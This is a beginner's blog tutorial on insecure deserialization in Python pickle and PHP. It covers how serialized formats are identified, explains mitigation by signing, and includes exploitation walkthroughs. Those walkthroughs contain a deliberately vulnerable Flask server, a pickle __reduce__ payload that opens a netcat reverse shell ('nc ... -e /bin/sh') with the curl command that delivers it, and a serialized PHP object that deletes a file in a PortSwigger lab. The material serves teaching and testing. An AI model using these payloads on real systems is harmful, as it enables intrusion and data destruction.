---
title: A Beginner's Guide To Insecure Deserialization
date: 2024-08-14
categories: [web]
tags: [web, appsec]
---

### Assalamualaikum! In this blog, I will be explaining what Insecure Deserialization is and how it can expose softwares and web applications to a wide range of security risks. Throughout the blog, I will also be going through some practical examples in Python and PHP. Let’s get started!

# (De)Serialization
Serialization is the process of converting an object or complex data structure into a format that can be easily stored in a database or transmitted over a network. Whereas deserialization is the reverse process of serialization. It involves reconstructing an object or a data structure from its serialized form. Simply put that deserialization takes serialized data and converts it back into its original form. Here is a basic illustration of the process:

```
Object ---> Serialization ---> Serialized Object / Transportable format  

Serialized Object / Data ---> Deserialization --> Original Object
```
## Examples

Let’s take a look at some examples in Python and PHP to better understand serialization and deserialization:

#### Python

In Python, there are multiple libraries which implement serializion, such as PyYAML (For YAML), JSONpickle (For JSON) and Pickle. However, Pickle is the native implementation. The following code snippet will print the serialized form or the pickled representation of the User object "newUser" (In Python, this process is also called pickling):
```python
import pickle  
  
class  User:  
	def  __init__(self, username, isAdmin):  
	self.username = username  
	self.isAdmin = isAdmin  
  
newUser = User("four0four", 1)  
serializedObject = pickle.dumps(newUser)  
print(serializedObject)
```
The serialized/pickled object will look like this:

```
b'\x80\x04\x95@\x00\x00\x00\x00\x00\x00\x00\x8c\x08__main__\x94\x8c\x04User\x94\x93\x94)\x81\x94}\x94(\x8c\x08username\x94\x8c\tfour0four\x94\x8c\x07isAdmin\x94K\x01ub.'
```

Now reading this serialized data is much harder than PHP as we will see in the next example. However, it is still possible to read it. If we read the the comments in the [Pickle library](https://github.com/python/cpython/blob/main/Lib/pickletools.py#L38), we get to know that:
```
A pickle is a program for a virtual pickle machine (PM). It’s a sequence of opcodes, interpreted by the PM, building an arbitrarily complex Python object.

For the most part, the PM is very simple: there are no looping, testing, or conditional instructions, no arithmetic and no function calls. Opcodes are executed once each, from first to last, until a STOP opcode is reached.

The PM has two data areas, "the stack"  and  "the memo".  
The memo serves as the PM's "long term memory".

The stack is basically a Last-In-First-Out (LIFO) data structure. You may push  
items onto the top of the stack or you may pop an item off the top of the stack.
```

Thus, the serialized object consists of a sequence of opcodes which are executed on the Pickle Machine (PM). These opcodes are defined [here](https://github.com/python/cpython/blob/3.10/Lib/pickle.py#L111). Let’s take a look at some common opcodes:
```
'\x80'  
- PROTO  
- Followed by a number that tells the PM the protocol version we are using  
- Example: '\x80\x04' (Means that we are using protocol version 4)  
  
'\x95'  
- FRAME  
- Followed by a number 'n' which tells the PM how long the serialized data is  
- Example: '\x95\xC' (Means the serialized data is 0xC or 12 bytes long)  
  
'\x8c'  
- SHORT_BINUNICODE  
- Followed by a number and a string which will be pushed onto the stack  
where the number is the length of the string  
- Example: '\x8c\x09four0four' (The string four0four will be pushed onto the stack)  
  
'K'  
- BININT1  
- Pushes a 1-byte unsigned integer onto the stack  
- Example: 'K\x01' (Pushes the value 1 onto the stack)  
  
'\x94'  
- MEMOIZE  
- Stores the top of the stack in memo  
  
'.'  
- STOP  
- Tells the PM that we are at the end  of the pickle
```
#### PHP

In PHP, the "serialize()" function is used to serialize data and "unserialize()" to unserialize it. Look at the following snippet which will print the serialized form of the User object "newUser":
```php
<?php  

class User {  
	public  $username;  
	public  $isAdmin;  
}  
  
$newUser = new User();  
$newUser->username = "four0four";  
$newUser->isAdmin = 1;  
  
echo serialize($newUser);  
?>
```
The serialized object will look like this:

```
O:4:"User":2:{s:8:"username";s:9:"four0four";s:7:"isAdmin";i:1;}
```
As we can see, this is much more readable than Python’s serialized format. Let’s break down the above serialized object to further understand what it means:

-   `O:4:"User"`  -> An object with a 4-character class name "User"
-   `2`  -> The object has 2 attributes/properties
-   `s:8:"username";`  -> The first attribute is a string that is 8 characters long: "username"
-   `s:9:"four0four";`  -> The value of the first attribute is a 9 characters long string: "four0four"
-   `s:7:"isAdmin";`  -> The second attribute, 7 characters long string: "isAdmin"
-   `i:1;`  -> The value of the second attribute is an integer with the value 1

Now to unserialize the data we would use "unserialize()".

# How deserialization becomes "insecure"

When user-controllable data is deserialized by an application without any proper validation or verification, that’s when it becomes "Insecure Deserialization". This potentially enables an attacker to manipulate the serialized objects to pass malicious data to the application leading to vulnerabilites like privilege escalation, denial of service or even gain Remote Code Execution!

The root cause of insecure deserialization vulnerabilities lies in the assumption by developers that users won’t be able to easily tamper with the serialized objects. This leads to the direct use of potentially malicious serialized objects without any validation. Even the documentation of different serialization libraries available don’t recommend the use of serialization in applications. Take a look at this:

**python**

![Python Pickle Documentation](https://i.imgur.com/ZYE9CDn.png)

**.NET (BinaryFormatter)**

![.NET (BinaryFormatter)](https://i.imgur.com/3uqrLZT.png)

**PHP**

![PHP unserialize() Manual](https://i.imgur.com/24Pla8C.png)

PHP recommends the use of "hash_hmac()" for data validation?

I will talk more about this in the "Preventing against Insecure Deserialization Vulnerabilities" section.

## Identifying Serialization

### White-Box Testing

If we have access to the application’s source code, we can look for specific function calls to quickly identify any possible deserialization vulnerability. These functions include (but not limited to):

-   readObject() — Java
-   unserialize() — PHP
-   unserialize()— node-serialize
-   pickle.loads() — Python Pickle
-   yaml.load() — Python PyYAML
-   jsonpickle.decode() — Python JSONPickle
-   Marshal.load() — Ruby
-   Deserialize() — C# / .NET
-   retrieve() — Perl Storable

### Black-Box Testing

If we don’t have access to the source code, we can still identify the serialized data just by looking at the format or the starting bytes.

**Python**

-   If it looks like: "ccopy_reg\n_reconstructor\np0\n(c__main__\nUser\np1\nc__builtin__\nobject\np2\nNtp3\nRp4\n(dp5\nVusername\np6\nVfour0four\np7\nsb." — Pickle Protocol 0
-   If bytes are starting with "80" followed by "01–05" (Hex) — Pickle Protocol 1–5
-   If it looks like: {"py/object": "\_\_main__.User", "username": "four0four"} — JSONPickle
-   If it looks like: "!!python/object:\_\_ main__.User\nusername: four0four\n" — PyYAML

**PHP**

-   If it looks like: "O:4:"User":1:{s:8:"username";s:9:"four0four";}"

**Java**

-   Bytes starting with "AC ED 00 05 74" in Hex
-   Base64 encoded as "rO0"

**.NET / C#**

-   Bytes starting with "01 00 00 00"
-   Base64 encoded data as "AAEAAAD/////"

# Exploiting Insecure Deserialization

Now we know how to identify serialized data by both black-box and white-box perspectives. Now let’s try exploiting Insecure Deserialization in Python and PHP.

## Python

I have created a simple web server vulnerable to insecure deserialization which accepts base64 encoded serialized data through the GET parameter "data" and deserializes it and shows the deserialized the output else it returns an error upon failing to do so.

```python
import pickle  
import base64  
from flask import Flask, request  
  
app = Flask(__name__)  
  
@app.route('/')  
def  index():  
	data = request.args.get('data')  
  
	if data:  
	decoded = base64.b64decode(data)  
	try:  
		deserialized = pickle.loads(decoded)  
		return  f'Deserialized Data: {deserialized}'  

	except Exception as e:  
		return  f'Error deserializing data: {e}'  

	else:  
		return  'No data parameter provided.'  
  
if __name__ == '__main__':  
	app.run()
```

Run the code and the vulnerable server will be hosted at http://127.0.0.1:5000. Let’s try giving it serialized data via the "data" parameter.

I passed the following encoded data:

```
gASVGAAAAAAAAACMFHMzcjE0bDF6NDcxMG4gMTUgRlVOlC4=
```

Which would print "s3r14l1z4710n 15 FUN" as shown below:

![Output of the deserialized data](https://i.imgur.com/bBUuO6d.png)

Remember to URL encode the "=".

Now what if we wanted to gain code execution?  
Turns out that we can control the behaviour of that by using the "\_\_reduce__()" method. According to the  [docs](https://docs.python.org/3/library/pickle.html#object.__reduce__):

> The `___reduce__()` method takes no argument and shall return either a string or preferably a tuple (the returned object is often
> referred to as the "reduce value"). […] When a tuple is returned, it
> must be between two and six items long. Optional items can either be
> omitted, or None can be provided as their value. The semantics of each
> item are in order:_
> 
> _-> A callable object that will be called to create the initial version of the object._
> 
> _-> A tuple of arguments for the callable object. An empty tuple must be given if the callable does not accept any argument. […]_

So by implementing the __reduce__ method in a class, we can pass a callable object and some arguments for the Pickle Machine to run. We can abuse it for getting a reverse shell by passing in "os.system()" as the callable object and the command to execute as the argument. Putting it altogether:

```python
import pickle
import base64
import os

class RCE:
    def __reduce__(self):
        return os.system, ("nc 127.0.0.1 1337 -e /bin/sh",)

object = RCE()
pickled = pickle.dumps(object)
encoded = base64.b64encode(pickled)

print(encoded)
```

Running the above code will result in:

```
b'gASVNwAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjBxuYyAxMjcuMC4wLjEgMTMzNyAtZSAvYmluL3NolIWUUpQu'
```

Copy just the base64 data and send it to the server via the "data" parameter. Before that start a netcat listener on port 1337.

```
# Netcat command for reverse shell
nc -lvnp 1337

# Send the payload via curl
curl http://localhost:5000/?data=gASVNwAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjBxuYyAxMjcuMC4wLjEgMTMzNyAtZSAvYmluL3NolIWUUpQu
```

After sending the payload, you can see we have successfully gotten a reverse shell!

![reverse shell](https://i.imgur.com/jNRhTpm.png)

That’s it for exploiting insecure deserialization in Python.

## PHP

For PHP, we will be solving a lab from Portswigger’s Web Security Academy.

**Lab: Arbitrary Object Injection in PHP**

Following is the lab description:

> This lab uses a serialization-based session mechanism and is vulnerable to arbitrary object injection as a result. To solve the lab, create and inject a malicious serialized object to delete the  `morale.txt`  file from Carlos's home directory. You will need to obtain source code access to solve this lab.
> 
> You can log in to your own account using the following credentials:  `wiener:peter`

We are also provided a hint:

> You can sometimes read source code by appending a tilde (`~`) to a filename to retrieve an editor-generated backup file.

Our goal is to create a malicious serialized object which would delete the file "morale.txt". Let’s login into the application and look at its functionality.

If we take a look at our session cookies, we get to know that the cookie is a base64 encoded PHP serialized object. Decoding the cookie, we get the serialized object of "User" class with two attributes: "username" and "access_token".

```
O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"jwcj6vkbi3f9fsd694l2rqntu8h9msfd";}
```
Moreover, if we look at the HTML source of the web app, we see a comment that says:
```
TODO: Refactor once /libs/CustomTemplate.php is updated
```

It hints to a PHP file: “/libs/CustomTemplate.php”. Upon visiting the file, we get a blank page. Remember the hint which we were given with the lab description? “Try appending a tilde “~” to the filename to retrieve an editor-generated backup file”.

Upon doing so, we get the source code of “CustomTemplate.php”.

```php
<?php

class CustomTemplate {
    private $template_file_path;
    private $lock_file_path;

    public function __construct($template_file_path) {
        $this->template_file_path = $template_file_path;
        $this->lock_file_path = $template_file_path . ".lock";
    }

    private function isTemplateLocked() {
        return file_exists($this->lock_file_path);
    }

    public function getTemplate() {
        return file_get_contents($this->template_file_path);
    }

    public function saveTemplate($template) {
        if (!isTemplateLocked()) {
            if (file_put_contents($this->lock_file_path, "") === false) {
                throw new Exception("Could not write to " . $this->lock_file_path);
            }
            if (file_put_contents($this->template_file_path, $template) === false) {
                throw new Exception("Could not write to " . $this->template_file_path);
            }
        }
    }

    function __destruct() {
        // Carlos thought this would be a good idea
        if (file_exists($this->lock_file_path)) {
            unlink($this->lock_file_path);
        }
    }
}

?>
```

Now when looking at the code, one function is an interesting one and that is “__destruct()” because it is a “magic method”. Magic methods are those special functions which are called automatically when certain events occur. For example, when a new object is created or deleted, a magic method would be called. Following are some common magic methods:

1. __toString():
The “__toString()” method allows a class to decide how it will react when it is treated like a string.

2. __destruct():

The “__destruct()” method is called when an object is destructed or the script has stopped or exited.

3. __construct():

Unlike destruct, the “__construct()” method is automatically called when an object is created.

In the above PHP code snippet, we can see that the __destruct method is used. What it does is it checks if a specific file exists. If it exists, it will call the “unlink()” function which basically just deletes the given file. Now it’s clear that we have to create a serialized object of the “CustomTemplate” class with the attribute “lock_file_path” with it’s value being set to “morale.txt” (the file which we want to delete in order to solve the lab).

From here, we can take two approaches to create the serialized object:

Build the serialized object by hand manually
Build the serialized object by using PHP’s serialize()
We will go with the second method.

First we will define the “CustomTemplate” class and its attribute “lock_file_path”. Then we will create the object and set the value of lock_file_path to “/home/carlos/morale.txt” (because we were said to delete the morale.txt from carlos’s home directory i.e. /home/carlos/). Then just serialize it and base64 encode it. Here is the script:

```php
<?php

class CustomTemplate{
    public $lock_file_path;
}

$obj = new CustomTemplate();
$obj->lock_file_path = "/home/carlos/morale.txt";
$serialized = serialize($obj);
$encoded = base64_encode($serialized);
echo $encoded;

?>
```

Run the above PHP code and you will get the base64 encoded serialized object. Now just replace your session cookie with this base64 encoded data in order to solve the lab.

![Lab Solved](https://i.imgur.com/kmTvEG4.png)

I didn’t cover the deserialization lab in which we would need to develop a custom gadget chain in order to achieve code execution because that would have gotten too much complicated. Let me know if I should make a walkthrough of any more labs :)

# Preventing against Insecure Deserialization Vulnerabilities

The most effective way to prevent insecure deserialization is to never deserialize user-input. If the attacker can’t control the serialized input, then the attacker won’t be able to pass in a malicious serialized payload. Thus, we’ll be save from deserialization attacks!

But let’s imagine we have to deserialize user-controlled data. One simple but really effective way to prevent deserialization attacks is by cryptographically signing the serialized data to ensure data integrity. Let’s understand this approach:

Serialize the object: First serialize whatever data has to be transmitted.
Calculate a signature using a secret key: Using a strong cryptopgraphic function like SHA-256, calculate the signature of the serialized object. The signature produced uniquely represents the serialized data.
Concatenate the signature with the serialized data: Now combine the singature and the serialized data via a separator like ‘.’ Such that:

```
"Serialized Data"."Unique Signature"
```

4. Transmit the data: Now transmite the serialized data along with the attached signature.

5. Verify integrity: When you receive the serialized data, seperate the signature from the serialized data. Then recalculate the signature of the serialized data you just receieved with the same cryptographic function and the same secret key.

6. Compare the signatures: Now compare the recalculated signature with the original signature. If both of the signature match, the data has not been tampered with and its integrity is verified. If they don’t match, the data may have been altered or tampered.

Just make sure to store the secret keys in a secure and safe place because if an attacker somehow managed to get or leak the secret keys, then the attacker could use the secret key to sign maliciously serialized objects and pass them to the server in order to exploit insecure deserialization.

## Bonus

Now, assuming you have become interested in deserialization attacks and want to learn more about them, this is for you. I have compiled a list of resources for learning about deserialization attacks, including links to presentations, talks, research papers, articles, labs, and some disclosed bug reports on HackerOne. These resources will help further your understanding of deserialization attacks. Here it is, [my github repository](https://github.com/f0ur0four/Insecure-Deserialization) where you can find the resources. Hope you like this blog and the resources too :)